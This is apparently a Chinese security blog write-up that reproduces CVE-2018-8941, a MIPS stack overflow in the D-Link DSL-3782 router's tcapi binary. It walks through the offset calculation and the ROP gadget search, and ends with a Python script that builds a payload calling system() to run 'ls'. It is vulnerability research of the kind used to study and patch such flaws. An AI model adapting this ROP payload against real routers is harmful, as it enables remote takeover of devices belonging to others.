**这次分析一个mips下栈溢出用到ROP的情况。**  

 **【传送门】**

> [通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃](http://www.freebuf.com/vuls/160040.html)
>
> [路由器漏洞复现分析第二弹：CNVD-2018-01084](http://www.freebuf.com/vuls/162627.html)
>
> [路由器漏洞复现分析第三弹：DVRF
> INTRO题目分析](http://www.freebuf.com/articles/wireless/163823.html)
>
>
> [路由器漏洞复现分析第四弹：CVE-2018-7034](http://www.freebuf.com/articles/wireless/165716.html)
>
>
> [路由器漏洞分析第五弹：CVE-2018-5767路由器远程代码执行](http://www.freebuf.com/articles/wireless/166869.html)
>
> [路由器漏洞分析第六弹 ：CVE-2018-7445 MikroTik 路由器系统缓冲区溢出漏洞
> ](http://www.freebuf.com/?p=168063)  
>

## 一. 漏洞概述

CVE-2018-8941 D-Link DSL-3782 代码执行  

友讯科技股份有限公司成立于1986年,专注于电脑网路设备的设计开发,并自创「D-Link」品牌,行销全球。  

此漏洞位于 D-Link DSL-3782路由器，授权用户可以远程代码执行

参考信息：<https://github.com/SECFORCE/CVE-2018-8941#cve-2018-8941-d-link-dsl-3782-code-execution-proof-of-concept>

漏洞固件版本：DSL-3782_A1_EU_1.01_07282016.bin

下载链接：

<https://eu.dlink.com/cz/cs/products/dsl-3782-wireless-ac1200-dual-band-vdsl-adsl-modem-router#Technical-Specifications>

漏洞存在于 “/USEFS/BI/TCAPI”二进制文件中，它被用作Web
GUI中“诊断”功能的实现代码，一个经过身份验证的用户可以使用一个长缓冲区作为参数，导致内存损坏。此外，可以重定向程序的流程并执行任意代码。

## 二. 漏洞分析

### 2.1 控制eip

对/userfs/bin/tcapi输入不当的参数会触发漏洞

MIPS 大端结构

![路由器漏洞分析第七弹：CVE-2018-8941
远程代码执行](https://image.3001.net/images/20180417/15239508648395.png!small)

Tcapiset 命令用法如下

![路由器漏洞分析第七弹：CVE-2018-8941
远程代码执行](https://image.3001.net/images/20180417/15239509359147.png!small)

tcapi set会调用Libtcapi.so.1中的tcapi_set函数

其中第二个Strcpy拷贝未验证src的长度,导致栈溢出

![路由器漏洞分析第七弹：CVE-2018-8941
远程代码执行](https://image.3001.net/images/20180417/15239509483264.png!small)  

ra放在-4 ，拷贝的目标地址在- 0x258，0x258-0x4=596,

Payload=”A”*596+”BBBB”测试一下

![图片.png](https://image.3001.net/images/20180417/15239509814448.png!small)

![路由器漏洞分析第七弹：CVE-2018-8941
远程代码执行](https://image.3001.net/images/20180417/15239509889538.png!small)  

Crash的时候，eip为42424242，位置正确，此时s1,s0,s2,s3 可以被控制

![路由器漏洞分析第七弹：CVE-2018-8941
远程代码执行](https://image.3001.net/images/20180417/15239510009497.png!small)  

### 2.2 构造rop链

貌似还是很友好

![路由器漏洞分析第七弹：CVE-2018-8941
远程代码执行](https://image.3001.net/images/20180417/15239510655923.png!small)  

  
由于本身文件很小，可能不太好找到合适的godget，看下内存，用了如下的lib文件

![路由器漏洞分析第七弹：CVE-2018-8941
远程代码执行](https://image.3001.net/images/20180417/15239510793045.png!small)

Libc里面的godget比较多，mips下的rop主要是去找到 move
t9,xxx;jalrt9这样的指令来达到控制执行流程的目的，其中xxx是我们在溢出的时候可以控制的寄存器。此漏洞中我们可以控制s0,s1,s2,s3
寄存器。

用misprop插件在IDA 搜索godget

直接搜索从栈中读取参数到寄存器的godget

![路由器漏洞分析第七弹：CVE-2018-8941
远程代码执行](https://image.3001.net/images/20180417/15239510884946.png!small)

找到如下的godget，把栈中的参数放到s5，再直接放到a0作为下一个call参数，并把system的地址从s0传到t9，一个godget搞定  

![路由器漏洞分析第七弹：CVE-2018-8941
远程代码执行](https://image.3001.net/images/20180417/15239511061406.png!small)

现在只差s5 的值了，可以看到s5=sp+0x10，那么在payload中ra的后面16字节后再放我们需要system执行的参数

![路由器漏洞分析第七弹：CVE-2018-8941
远程代码执行](https://image.3001.net/images/20180417/15239511166263.png!small)

我们的参数需要放到

构造如下的payload：

    
    
    #!/usr/bin/envpython
    
    import sys
    
    import struct
    
    libc =0x40868000
    
    s0=struct.pack(">I",0x408C1BB0)#system
    
    s1=struct.pack(">I",0x41414141)#useless
    
    s2=struct.pack(">I",0x43434343)#useless
    
    s3=struct.pack(">I",0x44444444)#useless
    
    ra=struct.pack(">I",0x4087E56C)#godget1
    
    x="A"*580+s0+s1+s2+s3+ra+"x"*16+"ls"

执行后，

可以在截图中看到，成功执行了我们的远程命令“ls“”

![路由器漏洞分析第七弹：CVE-2018-8941
远程代码执行](https://image.3001.net/images/20180417/15239511398614.png!small)

 ***本文作者：kczwa1，转载请注明来自FreeBuf.COM**  

